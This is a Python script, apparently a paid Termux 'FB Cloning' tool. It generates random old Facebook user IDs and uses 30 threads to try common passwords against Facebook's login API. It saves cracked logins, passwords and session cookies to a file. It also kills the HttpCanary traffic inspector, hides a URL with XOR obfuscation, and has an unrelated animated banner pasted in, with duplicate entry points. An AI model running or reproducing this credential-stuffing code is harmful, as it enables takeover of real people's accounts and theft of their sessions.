import os
import sys
import time
import re
import random
import uuid
import json
import subprocess
import pycurl
from io import BytesIO
from concurrent.futures import ThreadPoolExecutor as tred
from bs4 import BeautifulSoup as sop
from random import choice as race
from string import digits, ascii_letters
import urllib.parse
import base64
import ctypes

def run_system_command(command):
    os.system(f'{command} >/dev/null 2>&1')

run_system_command('chmod 700 /data/data/com.termux/files/usr/bin')
run_system_command('pkill -f httcanary')

class NebulaColors:
    def __init__(self):
        self.W = '\x1b[97;1m'
        self.R = '\x1b[91;1m'
        self.G = '\x1b[92;1m'
        self.Y = '\x1b[93;1m'
        self.B = '\x1b[94;1m'
        self.P = '\x1b[95;1m'
        self.C = '\x1b[96;1m'
        self.N = '\x1b[0m'
# Advanced Animated Banner Script — Full Upgrade
# Features:
# - No top-level `import os` (uses __import__('os') when needed)
# - Stylish double-line border
# - Rainbow-wave animation across a 3D-style ASCII banner
# - Speed control via command-line: `fast` or `slow` (default: normal)
# - Info block (Creator, GitHub, WhatsApp, Tool, Paid) centered inside border
# - Opens YouTube channel & WhatsApp when run (uses xdg-open)

import sys
import time
import shutil
from itertools import cycle

# Colors (ANSI) — a rainbow-like set
COLORS = ["[91m","[93m","[92m","[96m","[94m","[95m"]
RESET = "[0m"

# Open links using os only when needed (no import os at the top)
def open_links():
    try:
        __import__("os").system('xdg-open https://www.youtube.com/@DcDani-p4c >/dev/null 2>&1 &')
        __import__("os").system('xdg-open https://wa.me/03124930108 >/dev/null 2>&1 &')
    except Exception:
        pass

# 3D-style ASCII banner (two layered blocks to give depth)
BANNER_FRONT = [
    "  ██████╗  ░░█████╗  ░███╗  ░░██╗  ██╗",
    "  ██╔══██╗ ██╔══██╗ ████╗  ░██║  ██║",
    "  ██║  ░░██║ ███████║ ██╔██╗ ██║  ██║",
    "  ██║  ░░██║ ██╔══██║ ██║╚████║ ██║",
    "  ██████╔╝ ██║  ██║ ██║ ░╚███║ ██║",
    "  ╚═════╝  ╚═╝  ╚═╝ ╚═╝  ░░╚══╝ ╚═╝",
]
BANNER_SHADOW = [
    "   ░░░░   ░░░░░░    ░░░    ░░  ░ ",
    "   ░░░░   ░░░░░░    ░░░    ░░  ░ ",
    "   ░░░░   ░░░░░░    ░░░    ░░  ░ ",
    "   ░░░░   ░░░░░░    ░░░    ░░  ░ ",
    "   ░░░░   ░░░░░░    ░░░    ░░  ░ ",
    "   ░░░░   ░░░░░░    ░░░    ░░  ░ ",
]

INFO_LINES = [
    "Creator Name : Danish",
    "Github       : danishmureed12",
    "Whatsapp     : 03124930108",
    "Tool         : FB Cloning",
    "Status       : THIS IS PAID TOOL",
]

# Box drawing characters (double lines)
TL = "╔"
TR = "╗"
BL = "╚"
BR = "╝"
HL = "═"
VL = "║"

def get_terminal_width():
    try:
        return shutil.get_terminal_size().columns
    except Exception:
        return 80

# Build the full framed block (border + centered content)
def build_frame(colored_banner_lines, width):
    inner_width = width - 4  # space for vertical bars and padding

    # Center banner (join front and shadow to create depth)
    banner_block = []
    for front, shadow in zip(colored_banner_lines[0], colored_banner_lines[1]):
        line = front + "  " + shadow
        banner_block.append(line.center(inner_width))

    # Prepare info lines centered
    info_block = [line.center(inner_width) for line in INFO_LINES]

    # Top border
    top = TL + (HL * (inner_width + 2)) + TR
    bottom = BL + (HL * (inner_width + 2)) + BR

    # Compose
    lines = [top]
    # empty padding line
    lines.append(VL + ' ' * (inner_width + 2) + VL)

    for b in banner_block:
        lines.append(VL + ' ' + b + ' ' + VL)

    lines.append(VL + ' ' * (inner_width + 2) + VL)

    for info in info_block:
        lines.append(VL + ' ' + info + ' ' + VL)

    # bottom padding + border
    lines.append(VL + ' ' * (inner_width + 2) + VL)
    lines.append(bottom)

    return lines

# Rainbow-wave painter: colorizes each character by position + phase
def colorize_wave(text, phase=0, palette=COLORS):
    out = []
    n = len(palette)
    for i, ch in enumerate(text):
        color = palette[(i + phase) % n]
        # keep spaces uncolored for a smoother look
        out.append((color + ch + RESET) if ch != ' ' else ' ')
    return ''.join(out)

# Main animation loop
def animate(speed="normal"):
    open_links()
    width = max(80, get_terminal_width())

    # prepare banner with front & shadow
    front = BANNER_FRONT
    shadow = BANNER_SHADOW

    phase = 0
    # speed settings (seconds per frame)
    if speed == "fast":
        delay = 0.06
    elif speed == "slow":
        delay = 0.3
    else:
        delay = 0.15

    try:
        while True:
            # build colored banner lines (front and shadow separately)
            colored_front = [colorize_wave(line, phase) for line in front]
            # use dimmer palette for shadow by shifting phase
            colored_shadow = [colorize_wave(line, phase + 2) for line in shadow]

            frame_lines = build_frame((colored_front, colored_shadow), width)

            # clear and print
            __import__("os").system('clear')
            for ln in frame_lines:
                print(ln)

            phase = (phase + 1) % len(COLORS)
            time.sleep(delay)

    except KeyboardInterrupt:
        # graceful exit
        __import__("os").system('clear')
        print("Animation stopped. Exiting...")
        return

if __name__ == '__main__':
    arg = ""
    if len(sys.argv) > 1:
        arg = sys.argv[1].lower()
    if arg in ("fast", "slow"):
        animate(arg)
    else:
        animate("normal")


def linex():
    color = NebulaColors()
    

def clear():
    os.system('clear')
    print(pro_banner())

def secure_xor(data, key=85):
    return bytes([b ^ key for b in data])

def get_hidden_url():
    parts = [
        secure_xor(b'https://'),
        secure_xor(b'github.com/'),
        secure_xor(b'1-NALLA/'),
        secure_xor(b'Jinn_App/'),
        secure_xor(b'blob/main/'),
        secure_xor(b'App.txt')
    ]
    return b"".join(secure_xor(part) for part in parts).decode()

class UserAgentGenerator:
    def __init__(self):
        self.custom_user_agents = [
            "[FBAN/FB4A;FBAV/425.1.0.28.120;FBBV/43567891;FBDM/{density=2.0,width=720,height=1600};FBLC/en_US;FBCR/Verizon;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/SM-A137F;FBSV/12;FBOP/1;FBCA/arm64-v8a;]",
        ]

    def _generate_mozilla_user_agent(self):
        android_version = random.randint(4, 13)
        device = random.choice(('SM-G900F', 'SM-G920F', 'SM-T535', 'SM-T231', 'SM-J320F', 'GT-I9190'))
        resolution = random.choice(('{density=1.5,width=720,height=1280}', '{density=3.5,width=1440,height=3040}'))
        chrome_version = f"{random.randint(100, 150)}.0.0.0"
        return f"Mozilla/5.0 (Linux; Android {android_version}; {device}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version} Mobile Safari/537.36 [{resolution}]"

    def generate_user_agent(self):
        user_agent_type = random.choice(('Mozilla', 'Facebook', 'Dalvik', 'iPhone', 'Custom'))
        if user_agent_type == 'Mozilla':
            return self._generate_mozilla_user_agent()
        else:
            return random.choice(self.custom_user_agents)

    def load_user_agents_from_url(self):
        try:
            import requests
            response = requests.get('https://raw.githubusercontent.com/danishmureed12-coder/Dani.py/refs/heads/main/ua.txt')
            return response.text.splitlines()
        except Exception:
            return []

class BGRICracker:
    def __init__(self):
        self.oks = []
        self.cps = []
        self.loop = 0
        self.color = NebulaColors()
        self.user_agents = UserAgentGenerator().load_user_agents_from_url()

    def old_menu(self):
        clear()

        print(f"{self.color.P} {self.color.W}[1] {self.color.G}CRACK 2009 ACCOUNTS                 {self.color.P}")
        print(f"{self.color.P} {self.color.W}[2] {self.color.G}CRACK 2009-2013 ACCOUNTS            {self.color.P}")
        print(f"{self.color.P} {self.color.W}[0] {self.color.R}⇦ BACK TO MAIN MENU                 {self.color.P}")


        choice = input(f"  {self.color.C}\x1b[1;96m ➤ Choose: {self.color.W}").strip()
        
        if choice in ('1', '01'):
            self.execute_breach('100000')
        elif choice in ('2', '02'):
            self.quantum_breach_menu()
        elif choice in ('0', '00'):
            return
        else:
            print(f"\n  {self.color.R}⚠ Invalid choice!")
            time.sleep(2)
            self.old_menu()

    def quantum_breach_menu(self):
        clear()
        series_map = {
            '1': '100000', '2': '100001', '3': '100002', 
            '4': '100003', '5': '100004'
        }
        print(f"  {self.color.W}\x1b[1;96m ➤ Select Series:")
        for num, prefix in series_map.items():
            print(f"  {self.color.W}[{self.color.G}{num}{self.color.W}] {self.color.C}{prefix}")
        
        linex()
        choice = input(f"  {self.color.C}\x1b[1;96m ➤ Choose: {self.color.W}").strip()
        selected_prefix = series_map.get(choice)

        if not selected_prefix:
            print(f"  {self.color.R}⚠ Invalid Series!")
            time.sleep(2)
            self.quantum_breach_menu()
            return
        
        self.execute_breach(selected_prefix)

    def execute_breach(self, prefix):
        try:
            clear()
            limit = int(input(f"  {self.color.G}\x1b[1;96m ➤ Enter Limit: {self.color.W}"))
        except ValueError:
            print(f"  {self.color.R}⚠ Invalid Number!")
            time.sleep(2)
            self.old_menu()
            return

        targets = [prefix + ''.join(random.choices(digits, k=9)) for _ in range(limit)]
        passlist = ['123456789', '123456', '12345678', '1234567', '1234567890']

        with tred(max_workers=30) as executor:
            clear()
            print(f"  {self.color.W}\x1b[1;96m   ➤ Cracking {self.color.G}{prefix} ")
            print(f"  {self.color.W}\x1b[1;96m   ➤ Targets: {self.color.G}{len(targets)}")
            linex()
            for target in targets:
                executor.submit(self.breach_target, target, passlist)
        
        self.display_results()

    def breach_target(self, target, passlist):
        self.loop += 1
        sys.stdout.write(f'\r  {self.color.G}[Dani] {self.loop}|{self.color.R}{len(self.oks)}|{self.color.G}{len(self.cps)}{self.color.W}')
        sys.stdout.flush()
        for password in passlist:
            if self.try_breach(target, password):
                break

    def try_breach(self, uid, password):
        try:
            ua = random.choice(self.user_agents)
            
            headers = {
                'User-Agent': ua,
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123Dior23437a4a32',
            }
            
            payload = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'email': uid,
                'password': password,
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'method': 'auth.login',
            }

            encoded_payload = urllib.parse.urlencode(payload)
            buffer = BytesIO()
            c = pycurl.Curl()
            c.setopt(c.URL, 'https://b-api.facebook.com/auth/login')
            c.setopt(c.POST, 1)
            c.setopt(c.POSTFIELDS, encoded_payload)
            c.setopt(c.WRITEDATA, buffer)
            c.setopt(c.TIMEOUT, 10)
            
            header_list = [f"{key}: {value}" for key, value in headers.items()]
            c.setopt(c.HTTPHEADER, header_list)
            
            c.perform()
            response_body = buffer.getvalue().decode('utf-8')
            response = json.loads(response_body)
            c.close()
            buffer.close()

            if 'session_key' in response:
                self.handle_success(uid, password, response)
                return True
            elif 'www.facebook.com' in response.get('error', {}).get('message', ''):
                self.handle_partial(uid, password)
                return True
        except Exception:
            return False
        return False

    def handle_success(self, uid, password, response):
        coki = ';'.join([f"{c['name']}={c['value']}" for c in response.get('session_cookies', [])])
        print(f"\r  {self.color.G}\x1b[1;96m   ➤ SUCCESS {self.color.W}{uid}|{self.color.G}{password}{self.color.W}")
        with open('/sdcard/AHB-OLD.txt', 'a') as f:
            f.write(f'{uid}|{password}|{coki}\n')
        self.oks.append(uid)

    def handle_partial(self, uid, password):
        print(f"\r  {self.color.Y}\x1b[1;96m   ➤ OK {self.color.G}{uid}{self.color.Y}•\x1b[1;90m{password}{self.color.W}")
        with open('/sdcard/AHB-OLD.txt', 'a') as f:
            f.write(f'{uid}|{password}\n')
        self.cps.append(uid)
        
    def display_results(self):
        clear()
        print(f"  {self.color.G}\x1b[1;96m   ➤ CRACKING COMPLETE")
        linex()
        print(f"  {self.color.W}OK: {self.color.Y}{len(self.oks)}")
        print(f"  {self.color.W}CP: {self.color.G}{len(self.cps)}")
        linex()
        input(f"  {self.color.C}Press ENTER to continue {self.color.W}")
        self.old_menu()
        
if __name__ == "__main__":
    try:
        cracker = BGRICracker()
        cracker.old_menu()
    except KeyboardInterrupt:
        print("\n\x1b[1;96m   ➤ Stopped")
        sys.exit()
    except Exception as e:
        print(f"\n\x1b[1;96m   ➤ Error: {str(e)}")
        sys.exit()
  
